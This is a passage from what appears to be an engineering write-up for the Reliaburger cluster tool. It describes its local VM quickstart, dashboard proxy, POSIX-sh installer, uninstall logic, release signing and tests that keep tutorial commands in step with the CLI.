new, offline, verify-everything path through the most security-sensitive code
in the image store, to save a 1.9 MB BusyBox layer. The manifest round trips
to the registry, which Bun makes either way, would stay.

### Keep the host predictable

The managed Lima home lives inside `RELIABURGER_HOME`, so a user's global Lima
configuration cannot add host mounts or change the network behind our back.
A root-level setup lock protects the shared SSH identity and active context;
the per-cluster lock still protects lifecycle operations. VM names use a short
ownership identifier rather than the human-facing cluster name. Unix sockets
have a fixed path-length limit, so we check the complete socket path before
allocating anything and explain how to choose a shorter state directory.

Preflight checks the VM driver, available memory and disk, and the ports needed
by stopped or missing VMs. Already running VMs aren't charged twice. We wait
for guest provisioning to finish even when Lima reports the VM as running;
those are different milestones. The last forwarding rule excludes every other
TCP and UDP port on every guest interface. Lima's automatic forwarding is
helpful interactively, but it isn't part of this installation's contract.

The initial demo also depended on Docker Hub's anonymous pull allowance. A
failed cache integration caused repeated requests and exhausted it during the
real-VM test. We use the identical pinned BusyBox index from
[Docker's public ECR repository](https://www.docker.com/blog/news-from-aws-reinvent-docker-official-images-on-amazon-ecr-public/)
for quickstart. Changing the registry does not mean changing the workload:
the digest stays fixed, and the normal OCI client still resolves the host
architecture and checks downloaded content. This remains a network dependency,
so the signed cold-install gate must exercise it too.

The context also records the other loopback forwards, HTTP ingress on 18080 and the authenticated registry on 15050, so tools don't have to guess guest ports. And the guest's systemd unit mounts bpffs at `/sys/fs/bpf` in an `ExecStartPre` step if the base image didn't, so Bun never starts without the filesystem that holds its eBPF pins.

### Status from any node

A one-replica app can run on the third VM while your CLI connects to the first.
The old `relish status` asked only that first agent and printed “no workloads
running”. The request succeeded; the answer was still misleading.

The CLI now requests `/v1/status?cluster=true`. Bun collects its own instance
statuses, then asks the other known members for their local `/v1/status`.
Keeping the leaf endpoint local prevents recursive fan-out. Internal requests
reuse the cluster's HTTPS client and service bearer. Each row carries its node
name, so identical node-local instance IDs remain distinguishable.

The collector runs at most eight peer requests concurrently and puts a deadline
around each complete response, including its body. An unresponsive member makes
the operation fail with that node's name. An empty list should mean no workloads,
not that we silently dropped the machine running them. We test this with a
listener that accepts connections but never sends an HTTP response, as well as
three real agents queried from each node.

### A browser connection without copying the administrator token

The managed cluster API uses a private CA. Relish already knows that CA and the
operator's token, but a fresh browser knows neither. `relish dashboard` now opens
a read-only connection through a temporary loopback HTTP server in the CLI.
Relish continues to verify Bun's CA; the browser doesn't need a system trust-store
change.

The command prints and opens a one-use link containing a fresh random nonce.
The local server exchanges it for a separate HttpOnly, SameSite=Strict cookie
and redirects to `/`. Neither value is the cluster token. The server checks its
exact loopback Host and Origin, refuses cross-site requests and accepts only GET
and HEAD. The upstream bearer stays in Relish. Browser cookies and Authorization
headers aren't forwarded, redirects aren't followed, and response bodies stream
without whole-response buffering. Ctrl-C cancels those streams and closes the
browser connection while the cluster keeps running.

We use `AtomicBool` to consume the launch link once even if two requests arrive
concurrently. `Arc` lets cloned request state share that same flag. Each process
gets fresh random values, and the cookie name includes the listening port so two
local dashboard sessions don't overwrite one another's cookies.

The tests cover single-use exchange, cookie attributes, missing sessions, foreign
origins, DNS rebinding through a forged Host, mutation refusal, and a real upstream
HTTP server. That server verifies it received the saved CLI credential and never
the browser's supplied cookie or bearer.

The live browser check found another difference between a local build and a
copied binary. By default, `rust-embed` reads assets from the source tree in
debug builds. The qualification VM has no source tree, so its CSS and JavaScript
returned 404. We enable the crate's `debug-embed` feature as well as compression.
Cargo features select optional crate behaviour at compile time; here both debug
and release builds carry their assets. A development binary should exercise the
same standalone packaging contract as the release.

### Scripts read exit codes, not sentences

A script that runs `relish local status` can't read our intentions. It sees an exit code. The first version printed "Missing" or "API not ready" and still exited 0. Now every owned VM gets a condition:

```rust
pub enum NodeCondition {
    Ready,
    Missing,
    NotRunning { vm_state: String },
    ApiNotReady { reason: String },
    Unknown { reason: String },
}
```

Unlike a C enum, a Rust variant can carry its own fields, so "not running" arrives with the state Lima reported. The command prints every node and exits 1 unless all are `Ready`. `Unknown` counts as unhealthy: if we couldn't look, we can't claim it's fine. The older `relish dev` commands likewise validate their saved state file (cluster name, node list, VM ownership) before touching Lima, because parsing JSON proves we have Rust values, not that they describe *our* cluster.

The tutorial's "lose a node" step used to mean typing a `limactl` path and a
generated VM name. Now it's `relish local stop node-3`. `select_node` accepts
the name `relish nodes` prints (which is the VM name), a number from 1 or
`node-N`, and an unknown selector lists the valid ones. Stopping one node goes
through a pure function first, `stop_consequences`, which returns a sentence
for each reason the stop deserves a second thought: node 1 carries every host
port forward, and a stop that leaves fewer than a majority running takes the
council's quorum with it. Any reason means `--yes`. We didn't refuse outright;
killing the node the CLI talks to is a perfectly good experiment, just not one
you want to run by typing the wrong digit. The tests drive a fake `limactl`, a
five-line shell script that logs its arguments and answers `list --json` from
a file, so they can assert exactly which VM was stopped and that a refused
stop touched nothing.

Numbers are the other trap. `relish fault --duration 5m` must fit the request's seconds field:

```rust
let seconds = mins.checked_mul(60).ok_or_else(|| RelishError::ApiError {
    status: 0,
    body: format!("duration {s} exceeds the supported seconds range"),
})?;
```

Rust integer overflow panics in debug builds and silently wraps in release builds. `checked_mul` returns `Some(product)` when the result fits and `None` when it doesn't, and `ok_or_else` turns `None` into our error. Delays convert to nanoseconds with `u64::try_from(duration.as_nanos())` for the same reason: `as_nanos()` returns a `u128`, and an `as u64` cast would quietly drop the high bits and inject a different delay.

### Ship the bytes you tested

If a laptop test passes with one binary and the release tag then builds it again, we've tested one executable and published another. So the candidate workflow builds and signs once, from a commit on `main`, and records every asset's SHA-256 in `candidate.json`. Promotion checks the saved candidate against the digest kept at qualification time and publishes those exact bytes, with no compiler or signing key involved. It does hold a token that can write releases, so it runs only from `main` with `main`'s scripts and treats the tag strictly as data. Our first version ran the tagged tree's `candidate.py`, which let anyone who could push a tag hand that token a script of their own.

### `| sh`, not `| bash`

The homepage tells you to pipe the installer to `sh`. Our first installer said `bash` on its first line and used `[[ … =~ … ]]` to validate the version and the mirror URL, so `curl … | sh` failed on Ubuntu and Debian, where `sh` is dash, and in any container image with busybox. Bash's features were convenient. They weren't necessary.

Both scripts are now plain POSIX sh. A regular expression becomes a `case` pattern: `https:///*|*[?#@\\[:space:]]*` rejects an empty host and any credentials, query, fragment, backslash or whitespace, and `https://?*` accepts the rest. The version check first rejects every character outside `[A-Za-z0-9.-]`, which includes newlines, so the `grep -E` that checks its shape sees exactly one line and can't be fooled by a second.

`set -o pipefail` isn't POSIX either. Without it a pipeline's status is its last command's, so a failed `sha256sum | awk` looks like success with empty output. We don't rely on the status: the result is compared with the pinned digest, and an empty string never matches. That's the pattern throughout: every pipeline ends in a check that fails closed.

The body sits in a `main` function called on the last line. A piped shell executes the script as it arrives, so a download cut off halfway through would otherwise run half an installer. With the function, a truncated script defines nothing and runs nothing.

The packaging tests run both scripts under every POSIX shell they find, with a fake `curl` that serves fixtures, and under `shellcheck -s sh` when it's installed. On a Mac, `sh` is bash pretending to be POSIX, and it forgives things dash won't, so the tests run `dash` too when it's there (it ships with macOS).

### Getting onto `PATH` without editing your files behind your back

An installer that ends with "now add this directory to PATH" has handed you homework, and the next command in the tutorial fails until you do it. But an installer that quietly appends to your `.zshrc` has edited a file you care about without asking. We wanted neither.

The binary always lives in one place we own, `~/.reliaburger/bin`. Then there are three cases. If that directory is already on `PATH`, there's nothing to do. If `~/.local/bin` is on `PATH` (most Linux desktops, and plenty of Macs), we put a symbolic link to the binary there. Otherwise we print the one line your shell needs, choosing the file by `$SHELL`: `~/.zshrc` for zsh, `~/.bash_profile` for bash on macOS (Terminal starts login shells, which don't read `.bashrc`), `~/.bashrc` on Linux, and `fish_add_path` for fish. Then we ask whether to add it.

Why a link rather than a second copy? One real file means one checksum to verify, one atomic rename on upgrade, and an uninstaller that can tell our link from someone else's `relish`: it only removes a link that points into the store. For the same reason the installer never replaces anything already at `~/.local/bin/relish` unless it's our own link.

Asking has a catch. With `curl … | sh`, the shell's standard input *is* the script, so `read` would swallow the next line of the installer instead of your answer. We ask on `/dev/tty`, the controlling terminal, and only if the subshell `(exec </dev/tty)` can open it; in CI or over a pipe with no terminal, we print the line and move on. The default answer is no, the line is added at most once, and `--no-modify-path` keeps everything inside `~/.reliaburger`. The tests give the installer a pseudo-terminal as its controlling terminal and type the answer, which is the only honest way to exercise that prompt.

The last step is the quickstart's own "next:" message. Straight after installation your current shell still has the old `PATH`, so `relish status` would fail. `relish::install::invocation()` looks up `relish` on `PATH` the way a shell would, canonicalises both paths (resolving the link), and prints `relish` only if the lookup lands on the running executable. Otherwise it prints the full path, quoted for the shell if it contains a space.

### `relish uninstall`

A one-line install deserves a one-line way out. `relish local destroy` already removes a cluster; `relish uninstall` removes the rest: the CLI, its `~/.local/bin` link, the private Lima distribution in `tools/`, the guest images and binaries in `cache/`, and the managed Lima home.

The hard part is deciding what *not* to remove. `~/.reliaburger` is also where a server install keeps node data, and a saved context holds an administrator credential for a cluster that might still be running somewhere. So the module works from an allow-list: a handful of names the installer and the quickstart create, plus a link in `~/.local/bin` only if `read_link` says it points at our binary. Everything else under the home directory goes into the plan's `keep` list and gets printed, so you can see what stayed and why. `plan()` is a pure function of the directory tree, which makes it easy to test against a temporary home; `execute()` does the deleting.

Order matters too. While `clusters/` has a saved cluster, or the Lima home has a VM directory (Lima keeps `_config` and `_networks` beside one directory per VM), removing `tools/` would strand a running VM with no `limactl` to stop it. Uninstall refuses and names `relish local destroy`.

Two small Rust details. `std::fs::remove_dir_all` doesn't follow a symbolic link at the top level, so if someone made `cache` a link to a directory they care about, we remove the link and not their files; a test proves it. And the binary deletes itself. On Unix that's fine: unlinking removes the name from the directory, and the kernel keeps the file's contents alive until the running process closes it.

The shape of the errors follows the rest of the crate: a `thiserror` enum, `UninstallError`, whose messages say what to do next, and a `#[from]` conversion into `RelishError` so the binary's `?` just works. `#[from]` generates the `From` impl that the `?` operator calls to convert one error type into another.

### The tour, twice

The homepage has a "Try it in five minutes" section, and the CLI has the same tour as a manual chapter, `docs/manual/08_five-minute-tour.md`. Why both? Because the quickstart ends in a terminal, and "now go back to the website" is exactly the kind of context switch that loses people. Setup's last lines now say `relish manual tour`, with the full path to `relish` if your shell can't find it yet.

`relish manual` had no way to open one chapter, so it gained an optional positional argument. Clap already had a subcommand in that position (`relish manual examples`); it tries subcommand names first, so `examples` still means the subcommand and anything else becomes the chapter. A parser test pins that down, because it's the sort of precedence rule that changes quietly in a refactor.

`find_chapter` takes what you typed and tries, in order: an exact short name (`chaos`), a part of exactly one short name (`tour`), and a part of exactly one title. Ambiguity is an error that lists every short name rather than a guess. The short name comes from the file name, with `split_once('_')` dropping the number: `split_once` returns an `Option` of the two halves around the first match, and `map_or(stem, |(_, rest)| rest)` means "the part after the underscore, or the whole stem if there isn't one". The reader gained `open_document`, which selects the chapter and gives the content pane the keyboard, so the arrow keys scroll the tour straight away.

### A tutorial that can't lie

A tutorial is documentation that people copy and paste, so every stale flag in it becomes someone's first error message. The homepage tour runs about a dozen `relish` commands, and nothing stopped us renaming one of them next month.

So each command on the page carries a `data-tour` attribute, and `tests/suite/website.rs` pulls them out (the chapter's ```` ```sh ```` blocks too) and runs each one through the real command-line parser. Not a copy of the parser: the compiled `relish` binary, started with `RELISH_PARSE_ONLY=1`, which makes `main` return straight after `Cli::parse()`. That's a two-line hook, and it means the test exercises exactly what users run, including clap's global options and value parsers. We could have moved the `Cli` struct into the library so a test could call `Cli::try_parse_from`, but that would mean reshuffling a 3,000-line file several people are editing at once, for no extra coverage.

The same test checks that the page and the chapter list the same commands, that `relish manual tour` resolves to the tour chapter, and that the Pages workflow publishes the demo manifest from `examples/kubernetes/`, the file CI imports, rather than a second copy that could drift.

Some tour commands describe features still being built: `relish apply -f` for Kubernetes YAML and `relish local stop NODE`. They sit in a `PENDING` list, and the test requires them to *fail* to parse. The day one starts parsing, the test fails and says to delete its entry. An exemption that turns itself into a failure can't quietly outlive its reason, which is the whole point of the exercise.

CI skips the Rust jobs for documentation-only changes, and until now the website counted as documentation. `scripts/ci/select-jobs.sh` now treats `docs/website/index.html` as code, for the same reason it already treats the manual as code: a test reads it.
